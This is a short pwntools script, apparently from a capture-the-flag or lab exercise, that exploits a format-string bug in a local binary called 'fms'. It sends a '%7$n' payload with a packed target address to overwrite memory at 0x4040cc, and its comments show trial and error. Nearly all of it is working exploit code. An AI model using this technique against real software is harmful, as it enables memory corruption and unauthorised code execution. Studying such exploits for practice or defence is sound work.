from pwn import * 

r = process("./fms")
gdb.attach(r)

fixme = 0x4040cc

r.recvuntil(b">")

# Test with 64 bit:
# fixme = b"\x41\x42\x43\x44\x45\x46\x47\x48"

# Low bytes of target:
fixmebytes = b"\xcc\x40\x40"

# Entire target:
# fixme = b"\xcc\x40\x40\x00\x00\x00\x00\x00"
# This breaks, probably because of the null bytes.

payload = [
    b"a%7$n",
    b"\x00"*3,
    # b"%6$n",
    # fixmebytes,
    p64(fixme),
]
    
payload = b"".join(payload)
print("Payload: {}".format(payload.hex()))
print("Payload length: {}b".format(len(payload)))
r.sendline(payload)

r.interactive()
